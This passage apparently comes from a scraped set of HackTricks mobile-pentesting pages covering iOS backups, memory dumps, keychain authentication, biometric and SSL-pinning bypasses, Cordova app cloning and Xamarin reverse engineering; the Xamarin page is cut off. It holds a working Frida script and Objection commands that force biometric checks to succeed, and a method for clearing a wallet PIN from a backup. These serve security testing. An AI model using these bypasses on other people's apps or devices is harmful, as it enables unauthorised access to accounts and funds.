1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"\n>\n<\nplist\nversion\n=\n\"\n1.0\n\"\n>\n...\n<\nkey\n>\nDate\n</\nkey\n>\n<\ndate\n>\n2021-03-12T17:43:33Z\n</\ndate\n>\n<\nkey\n>\nIsEncrypted\n</\nkey\n>\n<\ntrue\n/>\n...\n</\nplist\n>\nIn case you need to work with an encrypted backup, there are some Python scripts in\nDinoSec's GitHub repo\n, such as\nbackup_tool.py\nand\nbackup_passwd.py\n, that will serve as a good starting point. However, note that they might not work with the latest iTunes/Finder versions and might need to be tweaked.\nYou can also use the tool\niOSbackup\nto easily read and extract files from a password-encrypted iOS backup.\nHow to modify the behaviour\nIn the open source bitcoin wallet app,\nBither\n, you'll see that it's possible to configure a PIN to lock the UI.\nThis is PIN is stored in the file\nnet.bither.plist\ninside the\npin_code\nkey\n.\nIf you clear this key from that plist in the backup and restores the backup, you will be able to access the wallet.\nTesting Memory for Sensitive Data\nAt some point sensitive information is going to be stored in memory. The objective is to make sure that this info is exposed as briefly as possible.\nTo investigate an application's memory, first create a\nmemory dump\n. Alternatively, you can\nanalyze the memory in real time\nwith, for example, a debugger. Regardless of the method you use, this is a very error-prone process because dumps provide the data left by executed functions and you might miss executing critical steps. In addition, overlooking data during analysis is quite easy to do unless you know the footprint of the data you're looking for (either its exact value or its format). For example, if the app encrypts according to a randomly generated symmetric key, you're very unlikely to spot the key in memory unless you find its value by other means.\nRetrieving and Analyzing a Memory Dump\nWether you are using a jailbroken or a non-jailbroken device, you can dump the app's process memory with\nobjection\nand\nFridump\n.\nAfter the memory has been dumped (e.g. to a file called \"memory\"), depending on the nature of the data you're looking for, you'll need a set of different tools to process and analyze that memory dump. For instance, if you're focusing on strings, it might be sufficient for you to execute the command\nstrings\nor\nrabin2 -zz\nto extract those strings.\n# using strings\n$ strings memory\n>\nstrings.txt\n‚Äã\n# using rabin2\n$ rabin2\n-ZZ\nmemory\n>\nstrings.txt\nOpen\nstrings.txt\nin your favorite editor and dig through it to identify sensitive information.\nHowever if you'd like to inspect other kind of data, you'd rather want to use radare2 and its search capabilities. See radare2's help on the search command (\n/?\n) for more information and a list of options. The following shows only a subset of them:\n$ r2\n<\nname_of_your_dump_file\n>\n‚Äã\n[\n0x00000000\n]\n>\n/?\nUsage: /\n[\n!\nbf\n]\n[\narg\n]\nSearch stuff\n(\nsee\n'e??search'\nfor\noptions\n)\n|\nUse io.va\nfor\nsearching\nin\nnon virtual addressing spaces\n|\n/ foo\n\\\nx00                    search\nfor\nstring\n'foo\\0'\n|\n/c\n[\nar\n]\nsearch\nfor\ncrypto materials\n|\n/e /E.F/i                    match regular expression\n|\n/i foo                       search\nfor\nstring\n'foo'\nignoring\ncase\n|\n/m\n[\n?\n][\nebm\n]\nmagicfile         search\nfor\nmagic, filesystems or binary headers\n|\n/v\n[\n1248\n]\nvalue\nlook\nfor\nan\n`\ncfg.bigendian\n`\n32bit value\n|\n/w foo                       search\nfor\nwide string\n'f\\0o\\0o\\0'\n|\n/x ff0033                    search\nfor\nhex string\n|\n/z min max                   search\nfor\nstrings of given size\n..\n.\nRuntime Memory Analysis\nBy using\nr2frida\nyou can analyze and inspect the app's memory while running and without needing to dump it. For example, you may run the previous search commands from r2frida and search the memory for a string, hexadecimal values, etc. When doing so, remember to prepend the search command (and any other r2frida specific commands) with a backslash\n\\\nafter starting the session with\nr2 frida://usb//<name_of_your_app>\n.\nBroken Cryptography\nPoor Key Management Processes\nSome developers save sensitive data in the local storage and encrypt it with a key hardcoded/predictable in the code. This shouldn't be done as some reversing could allow attackers to extract the confidential information.\nUse of Insecure and/or Deprecated Algorithms\nDevelopers shouldn't use\ndeprecated algorithms\nto perform authorisation\nchecks\n,\nstore\nor\nsend\ndata. Some of these algorithms are: RC4, MD4, MD5, SHA1... If\nhashes\nare used to store passwords for example, hashes brute-force\nresistant\nshould be used with salt.\nCheck\nThe main checks to perform if to find if you can find\nhardcoded\npasswords/secrets in the code, or if those are\npredictable\n, and if the code is using some king of\nweak\ncryptography\nalgorithms.\nIt's interesting to know that you can\nmonitor\nsome\ncrypto\nlibraries\nautomatically using\nobjection\nwith:\nios monitor crypt\nFor\nmore information\nabout iOS cryptographic APIs and libraries access\nhttps://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography\n‚Äã\nLocal Authentication\nThe tester should be aware that\nlocal authentication should always be enforced at a remote endpoint\nor based on a cryptographic primitive. Attackers can easily bypass local authentication if no data returns from the authentication process.\nThe\nLocal Authentication framework\nprovides a set of APIs for developers to extend an authentication dialog to a user. In the context of connecting to a remote service, it is possible (and recommended) to leverage the\nkeychain\nfor implementing local authentication.\nThe\nfingerprint ID\nsensor is operated by the\nSecureEnclave security coprocessor\nand does not expose fingerprint data to any other parts of the system. Next to Touch ID, Apple introduced\nFace ID\n: which allows authentication based on facial recognition.\nDevelopers have two options for incorporating Touch ID/Face ID authentication:\nLocalAuthentication.framework\nis a high-level API that can be used to\nauthenticate the user via Touch ID\n. The app can't access any data associated with the enrolled fingerprint and is notified only whether authentication was successful.\nSecurity.framework\nis a lower level API to access\nkeychain services\n. This is a secure option if your app needs to\nprotect some secret data with biometric authentication\n, since the access control is managed on a system-level and can not easily be bypassed.\nSecurity.framework\nhas a C API, but there are several\nopen source wrappers available\n, making access to the keychain as simple as to NSUserDefaults.\nPlease be aware that using either the\nLocalAuthentication.framework\nor the\nSecurity.framework\n, will be a control that can be bypassed by an attacker as it does only return a boolean and no data to proceed with. See\nDon't touch me that way, by David Lindner et al\nfor more details.\nLocal Authentication Framework\nDevelopers can display an\nauthentication prompt\nby utilizing the function\nevaluatePolicy\nof the\nLAContext\nclass. Two available policies define acceptable forms of authentication:\ndeviceOwnerAuthentication\n(Swift) or\nLAPolicyDeviceOwnerAuthentication\n(Objective-C): When available, the user is prompted to perform Touch ID authentication. If Touch ID is not activated, the device passcode is requested instead. If the device passcode is not enabled, policy evaluation fails.\ndeviceOwnerAuthenticationWithBiometrics\n(Swift) or\nLAPolicyDeviceOwnerAuthenticationWithBiometrics\n(Objective-C): Authentication is restricted to biometrics where the user is prompted for Touch ID.\nThe\nevaluatePolicy\nfunction returns a boolean\nvalue indicating whether the user has authenticated successfully. Which means that it can be easily bypassed (see below)\nLocal Authentication using Keychain\nThe\niOS keychain APIs can (and should) be used to implement local authentication\n. During this process, the app stores either a secret authentication token or another piece of secret data identifying the user in the keychain. In order to authenticate to a remote service, the user must unlock the keychain using their passphrase or fingerprint to obtain the secret data.\nThe keychain allows saving items with the special\nSecAccessControl\nattribute, which will allow access to the item from the keychain only after the user has passed Touch ID authentication (or passcode, if such a fallback is allowed by attribute parameters).\nIn the following example we will save the string \"test_strong_password\" to the keychain. The string can be accessed only on the current device while the passcode is set (\nkSecAttrAccessibleWhenPasscodeSetThisDeviceOnly\nparameter) and after Touch ID authentication for the currently enrolled fingers only (\nSecAccessControlCreateFlags.biometryCurrentSet\nparameter):\nSwift\nObjective-C\n// 1. create AccessControl object that will represent authentication settings\n‚Äã\nvar\nerror\n:\nUnmanaged\n<\nCFError\n>?\n‚Äã\nguard\nlet\naccessControl\n=\nSecAccessControlCreateWithFlags\n(\nkCFAllocatorDefault\n,\nkSecAttrAccessibleWhenPasscodeSetThisDeviceOnly\n,\nSecAccessControlCreateFlags\n.\nbiometryCurrentSet\n,\n&\nerror\n)\nelse\n{\n// failed to create AccessControl object\n‚Äã\nreturn\n}\n‚Äã\n// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute\n‚Äã\nvar\nquery\n:\n[\nString\n:\nAny\n]\n=\n[:]\n‚Äã\nquery\n[\nkSecClass\nas\nString\n]\n=\nkSecClassGenericPassword\nquery\n[\nkSecAttrLabel\nas\nString\n]\n=\n\"com.me.myapp.password\"\nas\nCFString\nquery\n[\nkSecAttrAccount\nas\nString\n]\n=\n\"OWASP Account\"\nas\nCFString\nquery\n[\nkSecValueData\nas\nString\n]\n=\n\"test_strong_password\"\n.\ndata\n(\nusing\n:\n.\nutf8\n)\n!\nas\nCFData\nquery\n[\nkSecAttrAccessControl\nas\nString\n]\n=\naccessControl\n‚Äã\n// 3. save item\n‚Äã\nlet\nstatus\n=\nSecItemAdd\n(\nquery\nas\nCFDictionary\n,\nnil\n)\n‚Äã\nif\nstatus\n==\nnoErr\n{\n// successfully saved\n}\nelse\n{\n// error while saving\n}\n// 1. create AccessControl object that will represent authentication settings\nCFErrorRef\n*\nerr\n=\nnil\n;\n‚Äã\nSecAccessControlRef sacRef\n=\nSecAccessControlCreateWithFlags\n(\nkCFAllocatorDefault\n,\nkSecAttrAccessibleWhenPasscodeSetThisDeviceOnly\n,\nkSecAccessControlUserPresence\n,\nerr\n);\n‚Äã\n// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute\nNSDictionary\n*\nquery\n=\n@\n{\n(\n_ _bridge id\n)\nkSecClass\n:\n(\n__bridge id\n)\nkSecClassGenericPassword\n,\n(\n__bridge id\n)\nkSecAttrLabel\n:\n@\"com.me.myapp.password\"\n,\n(\n__bridge id\n)\nkSecAttrAccount\n:\n@\"OWASP Account\"\n,\n(\n__bridge id\n)\nkSecValueData\n:\n[\n@\"test_strong_password\"\ndataUsingEncoding\n:\nNSUTF8StringEncoding\n],\n(\n__bridge id\n)\nkSecAttrAccessControl\n:\n(\n__bridge_transfer id\n)\nsacRef\n};\n‚Äã\n// 3. save item\nOSStatus status\n=\nSecItemAdd\n((\n__bridge CFDictionaryRef\n)\nquery\n,\nnil\n);\n‚Äã\nif\n(\nstatus\n==\nnoErr\n)\n{\n// successfully saved\n}\nelse\n{\n// error while saving\n}\nNow we can request the saved item from the keychain. Keychain services will present the authentication dialog to the user and return data or nil depending on whether a suitable fingerprint was provided or not.\nSwift\nObjective-C\n// 1. define query\nvar\nquery\n=\n[\nString\n:\nAny\n]()\nquery\n[\nkSecClass\nas\nString\n]\n=\nkSecClassGenericPassword\nquery\n[\nkSecReturnData\nas\nString\n]\n=\nkCFBooleanTrue\nquery\n[\nkSecAttrAccount\nas\nString\n]\n=\n\"My Name\"\nas\nCFString\nquery\n[\nkSecAttrLabel\nas\nString\n]\n=\n\"com.me.myapp.password\"\nas\nCFString\nquery\n[\nkSecUseOperationPrompt\nas\nString\n]\n=\n\"Please, pass authorisation to enter this area\"\nas\nCFString\n‚Äã\n// 2. get item\nvar\nqueryResult\n:\nAnyObject\n?\nlet\nstatus\n=\nwithUnsafeMutablePointer\n(\nto\n:\n&\nqueryResult\n)\n{\nSecItemCopyMatching\n(\nquery\nas\nCFDictionary\n,\nUnsafeMutablePointer\n(\n$0\n))\n}\n‚Äã\nif\nstatus\n==\nnoErr\n{\nlet\npassword\n=\nString\n(\ndata\n:\nqueryResult\nas\n!\nData\n,\nencoding\n:\n.\nutf8\n)\n!\n// successfully received password\n}\nelse\n{\n// authorization not passed\n}\n// 1. define query\nNSDictionary\n*\nquery\n=\n@\n{(\n__bridge id\n)\nkSecClass\n:\n(\n__bridge id\n)\nkSecClassGenericPassword\n,\n(\n__bridge id\n)\nkSecReturnData\n:\n@\nYES\n,\n(\n__bridge id\n)\nkSecAttrAccount\n:\n@\"My Name1\"\n,\n(\n__bridge id\n)\nkSecAttrLabel\n:\n@\"com.me.myapp.password\"\n,\n(\n__bridge id\n)\nkSecUseOperationPrompt\n:\n@\"Please, pass authorisation to enter this area\"\n};\n‚Äã\n// 2. get item\nCFTypeRef queryResult\n=\nNULL\n;\nOSStatus status\n=\nSecItemCopyMatching\n((\n__bridge CFDictionaryRef\n)\nquery\n,\n&\nqueryResult\n);\n‚Äã\nif\n(\nstatus\n==\nnoErr\n){\nNSData\n*\nresultData\n=\n(\n__bridge_transfer NSData\n*\n)\nqueryResult\n;\nNSString\n*\npassword\n=\n[[\nNSString alloc\n]\ninitWithData\n:\nresultData encoding\n:\nNSUTF8StringEncoding\n];\nNSLog\n(\n@\"%@\"\n,\npassword\n);\n}\nelse\n{\nNSLog\n(\n@\"Something went wrong\"\n);\n}\nDetection\nUsage of frameworks in an app can also be detected by analyzing the app binary's list of shared dynamic libraries. This can be done by using\notool\n:\n$ otool\n-L\n<\nAppName\n>\n.app/\n<\nAppName\n>\nIf\nLocalAuthentication.framework\nis used in an app, the output will contain both of the following lines (remember that\nLocalAuthentication.framework\nuses\nSecurity.framework\nunder the hood):\n/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication\n/System/Library/Frameworks/Security.framework/Security\nIf\nSecurity.framework\nis used, only the second one will be shown.\nLocal Authentication Framework Bypass\nObjection\n‚Äã\nObjection Biometrics Bypass\ncan be used to bypass LocalAuthentication. Objection\nuses Frida to instrument the\nevaluatePolicy\nfunction so that it returns\nTrue\neven if authentication was not successfully performed. Use the\nios ui biometrics_bypass\ncommand to bypass the insecure biometric authentication. Objection will register a job, which will replace the\nevaluatePolicy\nresult. It will work in both, Swift and Objective-C implementations.\n..\n.itudehacks.DVIAswiftv2.develop on\n(\niPhone:\n13.2\n.3\n)\n[\nusb\n]\n# ios ui biometrics_bypass\n(\nagent\n)\nRegistering job 3mhtws9x47q. Type: ios-biometrics-disable\n..\n.itudehacks.DVIAswiftv2.develop on\n(\niPhone:\n13.2\n.3\n)\n[\nusb\n]\n# (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself\n(\nagent\n)\n[\n3mhtws9x47q\n]\nOS authentication response:\nfalse\n(\nagent\n)\n[\n3mhtws9x47q\n]\nMarking OS response as True instead\n(\nagent\n)\n[\n3mhtws9x47q\n]\nBiometrics bypass hook complete\nIf vulnerable, the module will automatically bypass the login form.\nFrida\nAn example of a use of\nevaluatePolicy\nfrom\nDVIA-v2 application\n:\n+\n(\nvoid\n)\nauthenticateWithTouchID\n{\nLAContext\n*\nmyContext\n=\n[[\nLAContext\nalloc\n]\ninit\n];\nNSError\n*\nauthError\n=\nnil\n;\nNSString\n*\nmyLocalizedReasonString\n=\n@\n\"Please authenticate yourself\"\n;\nif\n([\nmyContext canEvaluatePolicy\n:\nLAPolicyDeviceOwnerAuthenticationWithBiometrics\nerror\n:\n&\nauthError\n])\n{\n[\nmyContext evaluatePolicy\n:\nLAPolicyDeviceOwnerAuthenticationWithBiometrics\nlocalizedReason\n:\nmyLocalizedReasonString\nreply\n:\n^\n(\nBOOL\nsuccess\n,\nNSError\n*\nerror\n)\n{\nif\n(\nsuccess\n)\n{\ndispatch_async\n(\ndispatch_get_main_queue\n(),\n^\n{\n[\nTouchIDAuthentication\nshowAlert\n:\n@\n\"Authentication Successful\"\nwithTitle\n:\n@\n\"Success\"\n];\n});\n}\nelse\n{\ndispatch_async\n(\ndispatch_get_main_queue\n(),\n^\n{\n[\nTouchIDAuthentication\nshowAlert\n:\n@\n\"Authentication Failed !\"\nwithTitle\n:\n@\n\"Error\"\n];\n});\n}\n}];\n}\nelse\n{\ndispatch_async\n(\ndispatch_get_main_queue\n(),\n^\n{\n[\nTouchIDAuthentication\nshowAlert\n:\n@\n\"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device\"\nwithTitle\n:\n@\n\"Error\"\n];\n});\n}\n}\nTo bypass the Local Authentication, we have to write a Frida script that\nbypasses\nthe aforementioned\nevaluatePolicy\n_ check. As you can see in the above-pasted code snippet, the\nevaluatePolicy\nuses a\ncallback\nthat determines the\nresult\n. So, the easiest way to achieve the hack is to intercept that callback and make sure it always returns the\nsuccess=1\n.\n// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/\nif\n(\nObjC\n.\navailable\n)\n{\nconsole\n.\nlog\n(\n\"Injecting...\"\n);\nvar\nhook\n=\nObjC\n.\nclasses\n.\nLAContext\n[\n\"- evaluatePolicy:localizedReason:reply:\"\n];\nInterceptor\n.\nattach\n(\nhook\n.\nimplementation\n,\n{\nonEnter\n:\nfunction\n(\nargs\n)\n{\nvar\nblock\n=\nnew\nObjC\n.\nBlock\n(\nargs\n[\n4\n]);\nconst callback\n=\nblock\n.\nimplementation\n;\nblock\n.\nimplementation\n=\nfunction\n(\nerror\n,\nvalue\n)\n{\nconsole\n.\nlog\n(\n\"Changing the result value to true\"\n)\nconst result\n=\ncallback\n(\n1\n,\nnull\n);\nreturn\nresult\n;\n};\n},\n});\n}\nelse\n{\nconsole\n.\nlog\n(\n\"Objective-C Runtime is not available!\"\n);\n}\nfrida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js\nSensitive Functionality Exposure Through IPC\nCustom URI Handlers / Deeplinks / Custom Schemes\niOS Custom URI Handlers / Deeplinks / Custom Schemes\nUniversal Links\niOS Universal Links\nUIActivity Sharing\niOS UIActivity Sharing\nUIPasteboard\niOS UIPasteboard\nApp Extensions\niOS App Extensions\nWebViews\niOS WebViews\nSerialisation and Encoding\niOS Serialisation and Encoding\nNetwork Communication\nIt's important to check that no communication is occurring\nwithout encryption\nand also that the application is correctly\nvalidating the TLS certificate\nof the server.\nTo check these kind of issues you can use a proxy like\nBurp\n:\niOS Burp Suite Configuration\nHostname check\nOne common issue validating the TLS certificate is to check that the certificate was signed by a\ntrusted\nCA\n, but\nnot check\nif\nthe hostname\nof the certificate is the hostname being accessed.\nIn order to check this issue using Burp, after trusting Burp CA in the iPhone, you can\ncreate a new certificate with Burp for a different hostname\nand use it. If the application still works, then, something it's vulnerable.\nCertificate Pinning\nIf an application is correctly using SSL Pinning, then the application will only works if the certificate is the once expected to be. When testing an application\nthis might be a problem as Burp will serve it's own certificate.\nIn order to bypass this protection inside a jailbroken device, you can install the application\nSSL Kill Switch\nor install\nBurp Mobile Assistant\n‚Äã\nYou can also use\nobjection's\nios sslpinning disable\nMisc\nIn\n/System/Library\nyou can find the frameworks installed in the phone used by system applications\nThe applications installed by the user from the App Store are located inside\n/User/Applications\nAnd the\n/User/Library\ncontains data saved by the user level applications\nYou can access\n/User/Library/Notes/notes.sqlite\nto read the notes saved inside the application.\nInside the folder of an installed application (\n/User/Applications/<APP ID>/\n) you can find some interesting files:\niTunesArtwork\n: The icon used by the app\niTunesMetadata.plist\n: Info of the app used in the App Store\n/Library/*\n: Contains the preferences and cache. In\n/Library/Cache/Snapshots/*\nyou can find the snapshot performed to the application before sending it to the background.\nHot Patching/Enforced Updateing\nThe developers can remotely\npatch all installations of their app instantly\nwithout having to resubmit the application to the App store and wait until it's approved.\nFor this purpose it's usually use\nJSPatch\n.\nBut there are other options also such as\nSiren\nand\nreact-native-appstore-version-checker\n.\nThis is a dangerous mechanism that could be abused by malicious third party SDKs therefore it's recommended to check which method is used to automatic updating (if any) and test it.\nYou could try to download a previous version of the app for this purpose.\nThird Parties\nOne problem of 3rd party SDKs is that there is\nno granular control over the features offered by the SDK\n. You could sue the SDK and have all features (including diagnostic leaks and insecure HTTP connections), or not use it. Also, usually it's no possible for the applications developers to\npatch a vulnerability\non the SDK.\nMoreover some SDKs start\ncontaining malware once they are very trusted\nby the community.\nBesides, the features these services provide can involve t\nracking services to monitor the user's behaviour\nwhile using the app, selling banner advertisements, or improving the user experience. The downside to third-party services is that developers don't know the details of the code executed via third-party libraries. Consequently, no more information than is necessary should be sent to a service, and no sensitive information should be disclosed.\nThe downside is that a\ndeveloper doesn‚Äôt know in detail what code is executed via 3rd party libraries\nand therefore giving up visibility. Consequently it should be ensured that not more than the information needed is sent to the service and that no sensitive information is disclosed.\nMost third-party services are implemented in two ways:\nwith a standalone library\nwith a full SDK\nAll data that's sent to third-party services should be anonymized to prevent exposure of PII (Personal Identifiable Information) that would allow the third party to identify the user account.\nYou can find the\nlibraries used by an application\nby running\notool\nagainst the app (and\nrunning\nit\nagainst\neach\nshared\nlibrary\nto find more shared libraries used).\nReferences\n‚Äã\nhttps://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering\n‚Äã\n‚Äã\niOS & Mobile App Pentesting - INE\n‚Äã\nMore Information\n‚Äã\nhttps://github.com/ivRodriguezCA/RE-iOS-Apps/\nIOS free course(\nhttps://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/\n)\n‚Äã\nhttps://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577\n‚Äã\n‚Äã\nhttps://www.slideshare.net/RyanISI/ios-appsecurityminicourse\n‚Äã\n‚Äã\nhttps://github.com/prateek147/DVIA\n‚Äã\n‚Äã\nhttps://github.com/prateek147/DVIA-v2\n‚Äã\n‚Äã\nhttps://github.com/OWASP/MSTG-Hacking-Playground%20\n‚Äã\nOWASP iGoat\nhttps://github.com/OWASP/igoat\n<<< Objective-C version\nhttps://github.com/OWASP/iGoat-Swift\n<<< Swift version\n‚Äã\nhttps://github.com/authenticationfailure/WheresMyBrowser.iOS\n‚Äã\n‚Äã\nhttps://github.com/nabla-c0d3/ssl-kill-switch2\n‚Äã\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nMobile Pentesting -\nPrevious\niOS Pentesting Checklist\nNext\niOS App Extensions\nLast modified\n1mo ago"
    },
    {
        "title": "Cordova Apps",
        "url": "https://book.hacktricks.xyz/mobile-pentesting/cordova-apps",
        "text": "Cordova Apps\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nInfo taken from the post\nhttps://infosecwriteups.com/recreating-cordova-mobile-apps-to-bypass-security-implementations-8845ff7bdc58\n‚Äã\nBasic Information\nApache Cordova is a popular framework that allows you to\ncreate hybrid applications\n(Android & iOS) using\nJavaScript, HTML and CSS\n.\nOne of the major issues with Cordova is it\ndoesn‚Äôt come with a default method to secure\nthe\nsource\nof the application, unlike react-native. The source of the Cordova application doesn‚Äôt have a default method to compile it which makes it\neasy for code tampering\n. The Cordova application uses WebView to render the application using HTML and JS which discloses the source code even after compiling it to APK or IPA whereas to react native use JavaScript VM to run the JavaScript Code.\nCloning Cordova Application\nTo create a Cordova app we need to install the NodeJS. Apart from NodeJS, we need a few other things installed to complete the build process like Android SDK, Java JDK and Gradle. You can follow the\nofficial documentation\nfor the list of requirements.\nFor this example, we can assume that the original application name is\nBank.apk\nand package name\ncom.android.bank\nUnzip the\nbank.apk\nand open the\nbank/assets/www\nfolder. We can view the\ncomplete source of the Cordova application\n. All the HTML and JS code can be used to create a clone of the application. We can also find the config file of the application in\nbank/res/xml/config.xml\n.\nNow we can create a new Cordova application project:\nnpm\ninstall\n-g\ncordova@latest\ncordova create bank-new com.android.bank Bank\ncd\nbank-new\nNow we need to copy all the files and folders from\nbank/assets/www\nto\nbank-new/www.\nWhen we copy the source code we need to exclude a few files and folders like\ncordova_plugins.js,cordova.js, cordova-js-src/, plugins/\n. We can copy all the files and folders excluding those mentioned above.\nWhen we create a new Cordova project we need to mention whether the app is for Android or iOS. Since we are cloning the Android app we need to add an Android platform to it. In Cordva we have the platform versions, each version has different features and support for Android APIs or Android versions.\nThe Android API and Cordova Android platform versions both are different. You can\ncheck out\nthe list of platform versions and their support for Android APIs.\nTo add the Cordova Android platform we need to find out which version was originally used by the application. If you use a different version you might face issues since we are using the same source code to clone the application. You can open the\ncordova.js\nfile and search\nPLATFORM_VERSION_BUILD_LABEL\nto find the version used by the application.\nNow we have added Android platform support we can add all the required plugins used by the application. In the original application\nbank/assets/www/cordova_plugins.js\n, We can find a list of all the plugins used by the application. We need to install those plugins one by one. Search for\nmodule.exports.metadata\nin\ncordova_plugins.js\nfile. We can see all the plugins with versions as well.\nCordva Plugins\nWe need to install all the plugins one by one with the help of the below command\ncd\nbank-new\ncordova plugin\nadd\n[email¬†protected]\nIf a plugin isn't available in npm search it on Github:\ncd\nbank-new\ncordova plugin\nadd\nhttps://github.com/moderna/cordova-plugin-cache.git\nTo compile the application, we need to make sure to have all requirements already installed.\ncd\nbank-new\ncordova requirements\nOnce we have all the setup ready we can build the apk.\ncd\nbank-new\ncordova build android ‚Äî\npackageType\n=\napk\nThe above build command will create an apk with debug method enabled which allows us to debug the application using Google Chrome. Before installing the apk make sure to sign the apk. If the application has code tampering detection it will be bypassed unless there is no specific configuration set.\nAutomatic Tool\n‚Äã\nMobSecco\n: A tool that automates the complete process of cloning the Android application.\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\niOS WebViews\nNext\n- Mobile Pentesting\nXamarin Apps\nLast modified\n4mo ago"
    },
    {
        "title": "Xamarin Apps",
        "url": "https://book.hacktricks.xyz/mobile-pentesting/xamarin-apps",
        "text": "Xamarin Apps\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nXamarin is an open-source platform that gives developers access to a comprehensive selection of tools and add-ons, allowing them to\ncreate modern apps for iOS, Android, and Windows using .NET and C#\nframeworks.\nXamarin Android Architecture\nXamarin offers .NET bindings to Android.* and Java.* namespaces. Xamarin.\nAndroid applications operate under the Mono execution environment, with the Android Runtime (ART) virtual machine running side by side.\nThe Mono execution environment calls into these namespaces through Managed Callable Wrappers (MCW) and gives Android Callable Wrappers (ACW) to the ART.\nBoth these environments run on top of the Linux kernel and invoke various APIs to the user code. The arrangement allows developers to access the underlying system.\nXamarin iOS Project\nXamarin.iOS applications run under the Mono runtime environment and use full Ahead of Time (AOT) compilation to compile C# .NET codes to ARM assembly language.\nIt runs along with the Objective-C Runtime. The runtime environments run on top of a UNIX-like kernel and invoke several APIs to the user code, which lets the developers access the underlying managed or native system.\nThe below-given diagram depicts this architecture:\nWhat is .Net Runtime and Mono Framework?\n.Net framework is a set of assemblies, classes, and namespaces\nthat developers can use to create applications; .Net Runtime runs the compiled code, and the process is called managed code execution. .NET Runtime provides several features that ensure platform independence and are compatible with older framework versions.\nMono Framework\nwas started in 2005 as an implementation of the .NET Framework for Linux (Ximian/SuSe/Novell). Sponsored by Microsoft and led by Xamarin, Mono is the .NET framework's open-source implementation based on the ECMA standards for Common Language Runtime and C#.\nReverse Engineering Techniques for Xamarin Apps\nDecompilation of Xamarin Assemblies\nDecompilation is the process used to produce source code from compiled code. To procure information about the assemblies and executables currently in memory, Windows is a great place.\nTo open the Modules window, select Debug > Windows > Modules. Once you detect the module that requires decompilation, right-click and select \"Decompile Source to Symbol File\". This action\nbuilds a symbol file that contains a decompiled source which\n, in turn, lets you enter into 3rd party code directly from your source code.\nVisual Studio\ndecompiles the managed code, even in the absence of symbols, allowing you to look at the code, inspect the variables and set breakpoints. To extract source code to disk, right-click on the module with embedded source and click \"Extract Embedded Source .\"This will export the source files to a Miscellaneous files folder for further analysis.\nJIT vs AOT Compilation of Xamarin Applications\nThese two options to compile C# based Xamarin code into an application, i.e,\nJust in time compilation and ahead of time compilation\n. The way of 